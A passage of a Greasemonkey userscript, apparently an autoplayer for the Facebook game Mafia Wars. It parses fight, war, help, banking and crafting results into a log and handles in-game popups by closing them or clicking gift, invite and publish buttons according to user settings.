                     ' <span class="bad">LOST ' + cashLoss + '.</span>';
        cashLoss = parseCash(cashLoss);
        GM_setValue('hitmanLossCountInt',GM_getValue('hitmanLossCountInt',0)+1);
        GM_setValue('hitmanLossDollarsInt', String(parseInt(GM_getValue('hitmanLossDollarsInt', 0)) + cashLoss));
        GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashLoss));
        GM_setValue('fightLoss$NY', String(parseInt(GM_getValue('fightLoss$NY', 0)) + cashLoss));
        if (context.id) {
          // Add the opponent to the avoid list.
          setHitmanOpponentAvoid(context.id);
          result += ' Avoiding.';
        }
        addToLog('omg Icon', result);
      } else if (innerNoTags.indexOf('This player is currently part of your mafia') != -1) {
        if (context.id) {
          setHitmanOpponentAvoid(context.id);
        }
      } else {
        DEBUG(inner);
      }
      if (innerNoTags.indexOf('You were snuffed') != -1) {
        addToLog('updateBad Icon', 'You <span class="bad">DIED</span>.');
      }
      if (targetKilled) {
        if (context.id) {
          addSavedListItem('hitmanListKilled', context.id, 100);
        }
        addToLog('killedMobster Icon', ' You <span class="bad">KILLED</span> ' +
                 linkToString(context.profile, 'user') +
                 ' and collected the <span class="money">' +
                 context.bounty + '</span> bounty set by ' +
                 linkToString(context.payer, 'user') + '.');

        GM_setValue('hitmanWinCountInt',GM_getValue('hitmanWinCountInt',0)+1);
        GM_setValue('hitmanWinDollarsInt', String(parseInt(GM_getValue('hitmanWinDollarsInt', 0)) + parseCash(context.bounty)));
        GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + parseCash(context.bounty)));
        GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + parseCash(context.bounty)));
      }
      updateLogStats(STAMINA_HOW_HITMAN);
      randomizeStamina();
      break;

    case 'war':
      // Remove invalid war targets
      if (innerNoTags.indexOf('Target user is not a friend') != -1 ||
        innerNoTags.indexOf('Target user does not exist') != -1) {
        removeSavedListItem('autoWarTargetList', context.target_id);
        addToLog('warning Icon', 'Invalid war target (id='+context.target_id+'). Removing from list.');
      }
      // Friend is already at war with somebody else
      else if (innerNoTags.indexOf('is already at war with someone else') != -1) {
        addToLog('info Icon', inner.split('.')[0] + '. Cycling warlist. ' );
        cycleSavedList('autoWarTargetList');
      }
      // Go back to war page after betrayal
      else if (innerNoTags.indexOf('You successfully betrayed') != -1) {
        addToLog(logIcon, inner.split('<br><br>')[0] + '</div>');
        break;
      }
      // Cycle war list after successful war declaration
      else if (innerNoTags.indexOf('You successfully declared war') != -1) {
        cycleSavedList('autoWarTargetList');
        addToLog('yeah Icon', inner);
      }
      // War attack result
      else if (innerNoTags.indexOf('WON') != -1 ||
               innerNoTags.indexOf('LOST') != -1) {
        var logIcon = innerNoTags.indexOf('LOST') != -1 ? 'omg Icon' : 'yeah Icon';
        if (innerNoTags.indexOf('to winning this war.') != -1)
          addToLog(logIcon, inner.split('to winning this war.')[0] + 'to winning this war.</div>');
        else
          addToLog(logIcon, inner);
      }
      else {
        addToLog('info Icon', inner);
      }

      if (helpWar) {
        // Help attempt was processed. Increment the update count.
        GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));
        helpWar = false;
      }

      // Visit the War Tab again
      setGMTime('warTimer', '00:00');
      Autoplay.start();
      return true;
      break;

    case 'stats':
      if (innerNoTags.match(/You just upgraded your (\w+) by (\d+)/i)) {
        var statName = RegExp.$1;
        var statIndex = eval(statName.toUpperCase() + '_STAT');
        var statIcon = eval(statName.toLowerCase() + 'Icon');
        var statIconTxt = statName.toLowerCase() + 'Icon';
        var statInc = isNaN(RegExp.$2) ? 1 : parseInt(RegExp.$2);
        GM_setValue('nextStat' , (statIndex + 1) % 4);
        switch (statIndex) {
          case ATTACK_STAT:    curAttack    += statInc; break;
          case DEFENSE_STAT:   curDefense   += statInc; break;
          case HEALTH_STAT:    maxHealth    += statInc; break;
          case ENERGY_STAT:    maxEnergy    += statInc; break;
          case STAMINA_STAT:   maxStamina   += statInc; break;
        }
        addToLog('process Icon', '<span style="color:#885588;">'+statIcon+' '+statName+' increased by '+statInc+' point(s).</span>');
      } else {
        DEBUG('Failed to increment stat.');
      }
      break;

    case 'accept':
      var accepts = innerNoTags.match(/You joined/gi);
      if (accepts) {
        addToLog('process Icon', 'Accepted ' + accepts.length + ' mafia ' +
                 (accepts.length > 1 ? ' invites.' : ' invite.'));
      } else {
        DEBUG('Unrecognized response for "accept" action : '+inner);
      }
      break;

    case 'energypack':
      addToLog('energyPack Icon', 'Used an <span class="good">Energy Pack</span>.');
      energyPackElt = undefined;
      DEBUG('Unrecognized response for "energypack" action : '+inner);
      break;

    case 'help':
      var helpElt = xpathFirst('.//a[contains(.,"Help ")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      // Help attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      var user = linkToString(xpathFirst('.//a[contains(@onclick,"xw_controller=stats&xw_action=view")]', messagebox), 'user');
      if (context && !user) {
        user = context.user;
      }
      if (innerNoTags.indexOf('not your friend') != -1 ||
          innerNoTags.indexOf('You need to be friends') != -1 ||
          innerNoTags.indexOf('to help on a job.') != -1) {
        addToLog('info Icon', 'Failed to help' + (user? ' ' + user : '') +
                 ' with job. Reason: not friends.');
      } else if (innerNoTags.indexOf('You are too late') != -1) {
        addToLog('info Icon', 'You are too late to help ' +
                 (user? ' ' + user : '') + ' with this job.');
      } else if (innerNoTags.indexOf('already helped') != -1) {
        addToLog('info Icon', 'Already helped ' + user + ' with this job.');
      } else if (innerNoTags.indexOf('You received') != -1 ||
                 innerNoTags.indexOf('You helped') != -1) {
        cost = innerNoTags.match(REGEX_CASH);
        experience = 0;
        if (innerNoTags.match(/(\d+)\s+experience\s+points?/i)) {
          experience = parseInt(RegExp.$1);
        }
        if (innerNoTags.indexOf('Special Bonus') != -1) {
          var loot = innerNoTags.split('gained a ')[1];
          addToLog('lootbag Icon', 'Found a <span class="loot">'+ loot.split('.<span')[0] + '</span> while helping on a job.');
        }
        result = 'You received ' + '<span class="good">' +
                 cost + '</span>' + ' and ' +
                 '<span class="good">' + experience + ' experience</span>' +
                 ' for helping ' + user + ' complete the job.';
        GM_setValue('passivetotalJobExpInt', parseInt(GM_getValue('passivetotalJobExpInt',0)) + experience);
        addToLog('updateGood Icon', result);
        updateLogStats();
      } else if (innerNoTags.indexOf('25 friends') != -1) {
        addToLog('info Icon', 'Failed to help' + (user ? ' ' + user : '') + ' with job. Reason: already helped 25 friends for the day in that city.');
      } else {
        addToLog('info Icon', 'WARNING: Not sure what happened when ' +
                 'trying to help' + (user? ' ' + user : '') + '.' +
                 (context? ' ' + context.help : '') +
                 ' Perhaps you interfered by clicking on something?');
      }
      Autoplay.start();
      return true;
      break;

    case 'help burners':
      var helpElt = xpathFirst('.//a[contains(.,"Accept")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help burners';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      // Help burners attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      addToLog('info Icon', innerNoTags);

      Autoplay.start();
      return true;
      break;

    case 'help parts':
      var helpElt = xpathFirst('.//a[contains(.,"Send Item")]', messagebox);
      // If help element is found, click it immediately
      if (helpElt) {
        Autoplay.fx = function() {
          clickElement(helpElt);
          clickAction = 'help parts';
          clickContext = context;
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

      DEBUG('Parsing parts help.');

      // Help parts attempt was processed. Increment the update count.
      GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));

      if (innerNoTags.indexOf('You sent ') != -1) {
        addToLog('info Icon', 'You sent ' + inner.split('You sent ')[1].split('</div>')[0]);
      }

      Autoplay.start();
      return true;
      break;

    case 'deposit':
      // Log if city has changed after banking
      if (parseInt(city) != parseInt(context)) {
        addToLog('warning Icon', 'Warning! You have traveled from ' +
                 cities[context][CITY_NAME] + ' to ' +
                 cities[city][CITY_NAME] +
                 ' while banking. Check your money.');
      }

      if (innerNoTags.match(/deposited/i)) {
        addToLog(cities[city][CITY_CASH_CSS], inner);
      } else {
        DEBUG(inner);
      }

      // Close banking
      var bankElt = xpathFirst('//div[@id="bank_popup"]');
      if (bankElt && bankElt.parentNode) closePopup(bankElt.parentNode, "Bank Popup");
      break;

    case 'withdraw':
      if (innerNoTags.match(/withdrew/i)) {
        addToLog(cities[city][CITY_CASH_CSS], inner);
      } else {
        DEBUG(inner);
      }

      // Close banking
      var bankElt = xpathFirst('//div[@id="bank_popup"]');
      if (bankElt && bankElt.parentNode) closePopup(bankElt.parentNode, "Bank Popup");
      break;

     case 'buy item':
      addToLog('info Icon', inner.untag());
      break;

    case 'buy property':
      addToLog('info Icon', inner);
      break;

    //case 'mission rewards':
    //  addToLog('info Icon', inner);
    //  break;  // newchangemission

    case 'crew collection':
      addToLog('info Icon', inner);
      break;

    case 'build item':
      var timerName = 'buildCarTimer';
      switch (context.buildType) {
        case 7: timerName  = 'buildPortTimer'; break;
        case 11: timerName = 'buildCarTimer'; break;
        case 12: timerName = 'buildWeaponTimer'; break;
        case 13: timerName = 'buildArmorTimer'; break;
        //case 14: timerName = 'buildPortTimer'; break;
        case 14: timerName = 'buildAnimalTimer'; break;
      }
      if (/You cannot craft/i.test(inner) ||
          /You do not have/i.test(inner) ||
          /You need a higher/i.test(inner) ) {
        if(context.buildType==4)  inner = "Port : " + inner;
        if(context.buildType==11) inner = "Chop Shop : " + inner;
        if(context.buildType==12) inner = "Weapons Depot : " + inner;
        if(context.buildType==13) inner = "Armory : " + inner;
        //if(context.buildType==14) inner = "Port : " + inner;
        if(context.buildType==14) inner = "Private Zoo : " + inner;
        setGMTime(timerName, '1 hour');
        addToLog('info Icon', inner);
      } else {
        setGMTime(timerName, '18 hours');
        if (inner.match(/You got (.+?)\./)) {
          var log = 'You built <span class="loot">'+ RegExp.$1+'</span>.';
          if (inner.match(/You gained.+&nbsp;(.+?)<\/div>/))
            log += ' You gained ' + RegExp.$1;
          addToLog('lootbag Icon', log);
        } else {
          addToLog('lootbag Icon', inner);
        }
      }
      break;

    default:
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized action "' +
               action + '".');
      DEBUG('Unrecognized Action :'+inner);
  }
  return false;
}

function closePopup(eltPopup, coolName) {
  // This routine needs the handle of the popup!
  // Not a button in the popup, but the main element
  // So if we figure out we have a button, then let's try
  // to find the main element

  if (!eltPopup) {
    DEBUG('Can not close ' + coolName + ' : popupElt undefined !');
    return false;
  }

  // Once we see a post pop-up, set the timer to close it
  DEBUG('Got rid of ' + coolName + ' popup: ' + eltPopup.id);
  var closeElt = xpathFirst('.//a[@class="pop_close"]',eltPopup);
  if (closeElt) {
    clickElement(closeElt);
    return true;
  }
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (skipPostElt) {
    clickElement (skipPostElt);
    return true;
  }

  // Try to close it the old fashioned way
  eltPopup.style.display = 'none';
  var popupIDBG = eltPopup.id.replace('_box','_box_bg');
  var eltPopupBG = document.getElementById(popupIDBG);
  if (eltPopupBG) eltPopupBG.style.display = 'none';
  popupIDBG = eltPopup.id.replace('_box','_bg');
  eltPopupBG = document.getElementById(popupIDBG);
  if (eltPopupBG) eltPopupBG.style.display = 'none';
  return true;
}

// Handle various popups
// This function is specifically for handling windows that popup
// during gameplay and we want to either grab some info off the
// window and log it, or we want to just close the window.
// This routing is not for clicking buttons other than to close the window.
function handlePopups() {
  // If we're not on the main window,
  // we're not doing any actions!
  if (window.top != window.self) {
    return;
  }

  // Refresh the publishing options
  fetchPubOptions();
  // Handle more popups that just show up out of nowhere
  try {
    // Look for Out of / Not Enough popups that are showing
    var popupContainers = $x('.//div[contains(@id,"other_lbox_main") and contains(@style, "block") and contains(@style, "z-index: 31")]', appLayoutElt);
    if (popupContainers && popupContainers.length > 0) {
      // Process each popup that is open
      for (var i = 0, iLength=popupContainers.length; i < iLength; ++i) {
        DEBUG('Popup Found: ' + popupContainers[i].id);
        if (popupContainers[i] && popupContainers[i].scrollWidth && popupContainers[i].innerHTML.length > 0) {
          var currentPopup = popupContainers[i];
          currentPopup.style.display='none';
          goHome();
        }
      }
    }

    // Look for all popups that are showing
    var popupElts = $x('.//div[(((contains(@id,"pop") and not(contains(@id,"pop_bg")) and not(contains(@id,"box_bg"))) and contains(@style, "block")) or contains(@id,"mystery")) and not(@id="popup_fodder")]', appLayoutElt);

    if (popupElts && popupElts.length > 0) {
      // Process each popup that is open
      for (var i = 0, iLength=popupElts.length; i < iLength; ++i) {
        DEBUG('Popup Found: ' + popupElts[i].id);
        if (popupElts[i] && popupElts[i].scrollWidth && popupElts[i].innerHTML.length > 0) {
          var currentPopup = popupElts[i];
          var popupInner = currentPopup.innerHTML;
          var popupInnerNoTags = popupInner.untag();
          // Skip these popups!
          if ( popupInner.indexOf('id="marketplace"') != -1 // The Marketplace
            || popupInner.indexOf('id="original_buyframe_popup"') != -1  // The Marketplace
            || popupInner.indexOf('marketplace_title.png') != -1  // The Marketplace
            || popupInner.indexOf('giftcard_iframe') != -1  // The Marketplace
            || popupInner.indexOf('xw_controller=hospital') != -1 // The Hospital
            || popupInner.indexOf('bank_popup') != -1 // The Bank
            || popupInner.indexOf('vault_popup') != -1 // Las Vegas Vault
            || popupInner.indexOf('xw_controller=challenge') != -1 // Challenges
            || popupInner.indexOf('Build Complete') != -1 // Chop Shop/Weapon Depot success popup
            || popupInner.indexOf('id="ChopShopCarousel"') != -1 // Chop Shop/Weapon Depot craft popup
            || popupInner.indexOf('mw_app=slotmachine') != -1 // Slot Machine
            || popupInner.indexOf('id="map_boss_fight"') != -1 // Vegas Boss fights
            || popupInner.indexOf('id="pop_box_map_boss_fight_popup"') != -1 // Boss fights
            || popupInner.indexOf('class="account_settings_title"') != -1 // Account Settings
            //|| popupInner.indexOf('TournamentController.nextPage()') != -1 // Tournament Ready to fight popup
            ) {
            continue;
          }

          /* THESE POPUPS get always processed/closed: */
          // Get rid of Paypal
          if (popupInnerNoTags.indexOf('paypal') != -1) return(closePopup(currentPopup, "Paypal"));

          // Get rid of buyframe popup (You are almost out of reward points)
          if (popupInner.indexOf('xw_action=buyframe_popup') != -1) return(closePopup(currentPopup, "Buy Reward Points"));

          // Get rid of Crime Spree Congratulations popup
          if (popupInnerNoTags.indexOf('safehouse_congrats') != -1) return(closePopup(currentPopup, "Crime Spree Congratulations"));

          // Get rid of Treasure Chest popup
          if (popupInnerNoTags.indexOf('Treasure Chest') != -1) return(closePopup(currentPopup, "Treasure Chest"));

          // Get rid of Keep Winning popup
          if (popupInnerNoTags.indexOf('Keep winning') != -1) return(closePopup(currentPopup, "Robbery Keep Winning"));

          // Get rid of Tired of Losing popup
          if (popupInnerNoTags.indexOf('Tired of losing') != -1) return(closePopup(currentPopup, "Robbery Tired of Losing"));

          // Get rid of 7-11 popup
          if (popupInnerNoTags.indexOf('seven_eleven') != -1) return(closePopup(currentPopup, "Seven Eleven"));

          // Get rid of Slots Collection popup
          if (popupInnerNoTags.indexOf('The Slots Collection') != -1) return(closePopup(currentPopup, "Slots Collection"));

          // Process The Global Cup Collection popup
          if (popupInnerNoTags.indexOf('The Global Cup Collection') != -1) return(closePopup(currentPopup, "The Global Cup Collection"));

          // Get rid of Grow your Mafia popup
          if (popupInnerNoTags.indexOf('friend to be in your mafia and help') != -1) return(closePopup(currentPopup, "Grow your Mafia"));

          // Get rid of Slot Machine Teaser popup
          if (popupInnerNoTags.indexOf('New Loot!') != -1) return(closePopup(currentPopup, "Slot Machine Flushed"));

          //newchange
          // Get rid of Proceed to Vegas Level 6 popup // need to check, closing something else
          // if (popupInnerNoTags.indexOf('Proceed to') != -1) return(closePopup(currentPopup, "Vegas Level 6"));

          // Get rid of Your Requests popup
          if (popupInnerNoTags.indexOf('Your Mafia Wars requests have moved to the left column on Facebook') != -1) return(closePopup(currentPopup, "Your Requests"));

          // Get rid of not enough health / stamina / energy popup
		      if (popupInnerNoTags.indexOf('not have enough') != -1) return(closePopup(currentPopup, "not enough health, stamina or energy"));

          // Get rid of out of health / stamina / energy popup
		      if (popupInnerNoTags.indexOf('out of') != -1) return(closePopup(currentPopup, "out of health, stamina or energy"));

		      // Get rid of You helped in . . . popup
		      if (popupInnerNoTags.indexOf('You helped in') != -1) return(closePopup(currentPopup, "You helped in"));

          // Get rid of Welcome to Tournaments popup
          if (popupInnerNoTags.indexOf('Become World Champion') != -1) return(closePopup(currentPopup, "Welcome to Tournaments"));

          // Get rid of Tournament Expired popup
          if (popupInnerNoTags.indexOf('Your previous tournament has expired') != -1) return(closePopup(currentPopup, "Tournament Expired"));

          /* THESE POPUPS get processed only when PS MWAP is running: */
          /* START */

          if (running) {
            //Not working since text is embedded in iframe ...
            // Get rid of Increase your mafia popup
            //if (popupInnerNoTags.indexOf('Increase your mafia! Increase your strength!') != -1 || popupInnerNoTags.indexOf('not in your Mafia yet') != -1) {
            //  return(closePopup(currentPopup, "Increase your mafia"));
            //}

            // Get rid of Increase your mafia popup
            var mafiaSuggestor = xpathFirst('.//div[@id="let_there_be_space"]',currentPopup);
            var mafiaRequestIfc = xpathFirst('.//div[@id="request_ifc"]',currentPopup);
            if (mafiaSuggestor && mafiaRequestIfc) {
                return(closePopup(currentPopup, "Increase your mafia"));
            }

            // Process "The Daily Take" popup
            if (popupInnerNoTags.indexOf('Keep the streak alive') != -1) {
              var logtxt='';
              if (popupInnerNoTags.match(/for playing ([0-9]+) days? in a row you got/i))
                logtxt = 'You played for ' + RegExp.$1 + ' day(s) straight.';
              var bonusElt = xpathFirst('.//div[contains(@style,"font-size: 18px; margin-bottom: 5px;")]', currentPopup);
              if (bonusElt && bonusElt.innerHTML) logtxt += (logtxt ? '<br/>' : '') + 'Bonus: <span class="loot">' + bonusElt.innerHTML + '</span>';
              addToLog('lootbag Icon',logtxt);
              return(closePopup(currentPopup, "The Daily Take"));
            }

            // Process Crime Spree popup
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"postFeedAndSendGiftBoxOpen")]',currentPopup);
            if (eltPubButton) {
              if (popupInnerNoTags.match(/and you got (.+?)\. Your/)) {
                DEBUG('Popup Process: Crime Spree Loot Processed');
                addToLog('lootbag Icon', 'Received <span class="loot">'+ RegExp.$1 + '</span> from the Crime Spree.');
              }
              clickElement(eltPubButton);
              return(closePopup(currentPopup, "Crime Spree Gifts"));
            }

            // Process Loyalty popup
            if (isGMChecked('autoGiftAccept') && popupInnerNoTags.indexOf('Show Your Loyalty') != -1) {
              // So there's a 3018 popup! Let's let Z do it for us!
              // Ok, so JQuery should already exist!
              $ = unsafeWindow.jQuery;
              var valueIcon = $("#cb_value_item").attr("src");
              var gagIcon = $("#cb_gag_item").attr("src");
              // If either Sabotage or Help is checked, skip this
              if ((valueIcon.indexOf('mw_messagebox_checkbox1.gif') == -1) && (gagIcon.indexOf('mw_messagebox_checkbox1.gif') == -1)) {
                var eltGag = document.getElementById('gag_item_id');
                var eltValue = document.getElementById('value_item_id');
                var eltRewardNRG = document.getElementById('nrg_gain_url');
                var eltRewardSTA = document.getElementById('sta_gain_url');
                var eltLoyalty = document.getElementById('gift_popup_send_gift');
                switch (GM_getValue('autoGiftAcceptChoice',0)) {
                  case 0: //HELP
                    if (eltValue) $('#cb_value_item').click();
                    break;
                  case 1: //SABOTAGE
                    if (eltGag) $('#cb_gag_item').click();
                    break;
                }
                switch (GM_getValue('autoGiftAcceptReward',0)) {
                  case 0: // ENERGY
                    if (eltRewardNRG) $('#cb_nrg_gain').click();
                    break;
                  case 1: // STAMINA
                    if (eltRewardSTA) $('#cb_sta_gain').click();
                    break;
                }
                // Click the loyalty button
                if (eltLoyalty) {
                  $('#gift_popup_send_gift').click();
                  DEBUG('Popup Process: Show Your Loyalty Processed');
                }
                // At this point the button should force the screen to refresh
              }
              return true;
            }

            // Accept Gifts from MESSAGE CENTER / Total Requests popup
            if (popupInnerNoTags.indexOf('Total Requests') != -1) {
              var acceptgiftButtons = $x('.//a[@class="sexy_button_new medium white" and contains(@onclick,"accept_gift")]',currentPopup);
              if(acceptgiftButtons && isGMChecked('autoAcceptMsgGifts')) {
                for(i=0;i<acceptgiftButtons.length>0;++i){
                  acceptgiftButton = acceptgiftButtons[i];
                  clickElement(acceptgiftButton);
                }
                DEBUG('Popup Process: MESSAGE CENTER - '+acceptgiftButtons.length+' Gifts Accepted');
              }
              // Accept Boosts from MESSAGE CENTER / Total Requests popup
              acceptgiftButtons = $x('.//a[@class="sexy_button_new medium white" and contains(@onclick,"accept_boost")]',currentPopup);
              if(acceptgiftButtons && isGMChecked('autoAcceptMsgBoosts')) {
                for(i=0;i<acceptgiftButtons.length>0;++i){
                  acceptgiftButton = acceptgiftButtons[i];
                  clickElement(acceptgiftButton);
                }
                DEBUG('Popup Process: MESSAGE CENTER - '+acceptgiftButtons.length+' Boosts Accepted');
              }
              // Accept Mafia Invites from MESSAGE CENTER / Total Requests popup
              var acceptButtons = $x('.//a[@class="sexy_button_new medium white" and contains(.,"Join Mafia")]',currentPopup);
              if(acceptButtons && isGMChecked('acceptMafiaInvitations')) {
                for(i=0;i<acceptButtons.length>0;++i){
                  acceptButton = acceptButtons[i];
                  clickElement(acceptButton);
                }
                DEBUG('Popup Process: MESSAGE CENTER - Added '+acceptButtons.length+' members to your mafia.');
              }
              // Accept Crime Spree Request from MESSAGE CENTER / Total Requests popup
              var eltPubButton = xpathFirst('.//a[@class="sexy_button_new medium white" and contains(.,"Sabotage")]',currentPopup);
              if (eltPubButton && isGMChecked('autoGiftAccept')) {
                clickElement(eltPubButton);
                DEBUG('Popup Process: MESSAGE CENTER - Accepted a Crime Spree Request.');
                return true;
              }
              return(closePopup(currentPopup, "MESSAGE CENTER"));
            }
            // Process Sharing Secret Stash
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"post_job_loot_feed")]',currentPopup);
            if (eltPubButton) {
              DEBUG('Popup Process: Share Secret Stash Processed');
              if (isGMChecked('autoSecretStash')) {
                clickElement(eltPubButton);
              }
                return(closePopup(currentPopup, "Secret Stash"));
            }

            // Process Secret Stash
            var autoSecretStashList=getSavedList('secretStashItems',"");
            if (popupInnerNoTags.indexOf('Get yours') != -1) {
              DEBUG('Popup Process: Get Secret Stash Processed');
              var eltButton = xpathFirst('.//button',currentPopup);
              if (eltButton) {
                var eltLoot1 = xpathFirst('.//div[contains(@id,"job_gift_item_1")]',currentPopup);
                var lootChoice = eltLoot1;
                var eltLoot2 = xpathFirst('.//div[contains(@id,"job_gift_item_2")]',currentPopup);
                var eltLoot3 = xpathFirst('.//div[contains(@id,"job_gift_item_3")]',currentPopup);
                if (eltLoot1 && isGMChecked('useSecretStashItems') && autoSecretStashList) {
                  if (eltLoot1 && eltLoot2 && eltLoot3) {
                    for (var j = 0; j < autoSecretStashList.length; ++j) {
                      if (eltLoot1.innerHTML.untag().indexOf(autoSecretStashList[j])!=-1) {
                        lootChoice = eltLoot1;
                        break;
                      }
                      if (eltLoot2.innerHTML.untag().indexOf(autoSecretStashList[j])!=-1) {
                        lootChoice = eltLoot2;
                        break;
                      }
                      if (eltLoot3.innerHTML.untag().indexOf(autoSecretStashList[j])!=-1) {
                        lootChoice = eltLoot3;
                        break;
                      }
                    }
                  } else {

                    addToLog('info Inco', "Error in undefined loots.  Please report the following message:" + currentPopup);
                    return(closePopup(currentPopup, "Process Secret Stash"));
                  }
                }
                if (lootChoice) {
                  clickElement(lootChoice);
                  DEBUG('Choose between '+eltLoot1.innerHTML.untag()+', '+eltLoot2.innerHTML.untag()+' and '+eltLoot3.innerHTML.untag());
                }
                var lootLogTxt = lootChoice.innerHTML.untag();
                if(lootLogTxt.match(/(.+?)(Collection|Used)/i)) lootLogTxt = RegExp.$1;
                addToLog('lootbag Icon', 'Choose  <span class="loot">'+ lootLogTxt + '</span> from a secret stash.');
                clickElement(eltButton);
              }
              return(closePopup(currentPopup, "Process Secret Stash"));
            }

            // Process Red Mystery Bag popup
            if (currentPopup.id.indexOf('mystery_bag_drop') != -1) {
              DEBUG('Popup Process: Red Mystery Bag Processed');
              eltLoot = xpathFirst('.//div[contains(@class,"good")]',currentPopup);
              if (eltLoot) {
                addToLog('lootbag Icon', 'Received <span class="loot">'+ eltLoot.innerHTML.untag() + '</span> from a red mystery bag.');
              }
              return(closePopup(currentPopup, "Red Mystery Bag"));
            }

            // Process Iced popup
            if (popupInner.indexOf('iced_pop') != -1) {
              var icedCountTextElt = xpathFirst('.//div[@class="iced_pop_body_count_text"]');
              var icedCountElt = xpathFirst('.//div[@class="iced_pop_body_count_number"]');
              var opponentElt = xpathFirst('.//div[@class="fightres_opponent"]');
              var opponentNameElt = xpathFirst('.//div[@class="fightres_name"]/a', opponentElt);
              if (icedCountElt && icedCountTextElt && opponentElt) {
                bodyCount = parseInt(icedCountElt.innerHTML.replace(',', ''));
                IcedPublishingCount = parseInt(GM_getValue('IcedPublishingCount')) ? parseInt(GM_getValue('IcedPublishingCount')) : 0;
                publishFrequency =  parseInt(GM_getValue('autoIcePublishFrequency')) ? parseInt(GM_getValue('autoIcePublishFrequency')) : 1;
                logFrequency = parseInt(IcedPublishingCount % publishFrequency);
                eltIce = xpathFirst('.//a[contains(.,"Share with Friends")]', currentPopup);
                if(eltIce && isGMChecked('autoIcePublish') && (IcedPublishingCount % publishFrequency == 0)) {
                  addToLog('info Icon', 'You <span style="color:#00FFFF;">ICED</span> ' +
                  linkToString(opponentNameElt, 'user') + '. ' + icedCountTextElt.innerHTML + ' <span style="color:#00FFFF;">' +
                  icedCountElt.innerHTML + '</span> and published Iced Bonus ('+logFrequency+'/'+publishFrequency+')');
                  clickElement(eltIce);
                  DEBUG('handlePopups(): Clicked to publish iced opponent bonus.');
                } else {

                  logtxt = 'You <span style="color:#00FFFF;">ICED</span> ' + linkToString(opponentNameElt, 'user') + '. ' +
                           icedCountTextElt.innerHTML + ' <span style="color:#00FFFF;">' + icedCountElt.innerHTML + '</span>.';
                  if(isGMChecked('autoIcePublish')) logtxt+= ' Iced bonus not published ('+logFrequency+'/'+publishFrequency+')';
                  addToLog('info Icon', logtxt);
                }
                IcedPublishingCount+=1;
                GM_setValue('IcedPublishingCount',IcedPublishingCount);
              }
              return(closePopup(currentPopup, "Iced Popup"));
            }

            // Process Reward for Energy Packs
            if (popupInner.indexOf('Thank') != -1 && isGMChecked('rewardEnergyPack')) {
              var energyReward;
              var energyRewardID;
              var i=1;
              energyRewardID = 'energy_thnx_btn_'+i;
              while(energyReward = document.getElementById(energyRewardID, currentPopup)){
                var eltThanx = xpathFirst('.//a[contains(.,"Thank")]', energyReward);
                if(eltThanx){
                  clickElement(eltThanx);
                  addToLog('info Icon','You sent a gift to reward Helper : '+i);
                } else {
                  DEBUG('Gift already sent to Helper : '+i);
                }
                i++;
                energyRewardID = 'energy_thnx_btn_'+i;
              }
              return(closePopup(currentPopup, "Energy Reward"));
            }

            // Process Robbery Loot popup
            if (popupInnerNoTags.indexOf('You cleared the full board') != -1) {
              // Look for any loot on popup
              DEBUG('Popup Process: Processing robbing board');
              if (popupInnerNoTags.match(/(\d+) Bonus Experience/i)) {
                var exp = RegExp.$1.replace(/[^0-9]/g, '');
                var boardrecord ="";
                if (popupInner.match(/Your record on this board was\s+(.+?)\./i)) boardrecord = ' Record: <span class="good">' + RegExp.$1+'</span>';

                addToLog('yeah Icon', 'Robbing board cleared. Bonus: <span class="good">' + exp + ' Experience</span>.'+ boardrecord);
                if (!isGMChecked('fastRob')) {
                  updateRobStatistics(null,parseInt(exp));
                  updateLogStats();
                }
              if (popupInner.match(/You\s+(earned|gained|received|collected)\s+(some|an?)\s+bonus\s+(.+?)<\/div>/i)) {
                addToLog('lootbag Icon', 'Found <span class="loot">'+ RegExp.$3 + '</span> on robbing board.');
              }
              }
              return(closePopup(currentPopup, "Robbing Board Popup"));
            }

            // Process Level Up popup
            var eltPubButton = xpathFirst('.//a[contains(@onclick,"postLevelUpFeedAndSend")]',currentPopup);
            if (eltPubButton) {
              if (popupInnerNoTags.match(/promoted to level (.+?) c/i)) {
                addToLog('info Icon', '<span class="loot">'+' You were promoted to level '+ RegExp.$1);
              }
              if (isGMChecked('autoLevelPublish')) {
                clickElement(eltPubButton);
              }
              return(closePopup(currentPopup, "Level Up"));
            }


// Missions popups
            // Get rid of not in mission popup
            if (popupInnerNoTags.indexOf('not involved in this mission') != -1) {
              return(closePopup(currentPopup, "Not in Mission"));
            }

            // Start a New Mission
            if (popupInnerNoTags.indexOf('Start operation') != -1) {
              var missionButton = xpathFirst('.//a[@class="sexy_button_new medium white" and contains(@onclick,"postCelebrateFeed")]',currentPopup);
              if(missionButton) {
                if (isGMChecked('AutoMafiaMission')) {
                  clickElement(missionButton);
                  DEBUG('Popup Process: MISSIONS - Started My own Mission');
                }
              }
              return(closePopup(currentPopup, "Start Mission"));
            }

            // Start a New Mission
            if (popupInnerNoTags.indexOf('Invite Friends') != -1) {
              var missionButton = xpathFirst('.//a[@class="sexy_button_new medium white" and contains(@onclick,"postCelebrateFeed")]',currentPopup);
              if(missionButton) {
                if (isGMChecked('AutoMafiaMission')) {
                  clickElement(missionButton);
                  DEBUG('Popup Process: MISSIONS - Started My own Mission');
                }
              }
              return(closePopup(currentPopup, "Start Mission"));
            }

            // Claim Mission Rewards Failed
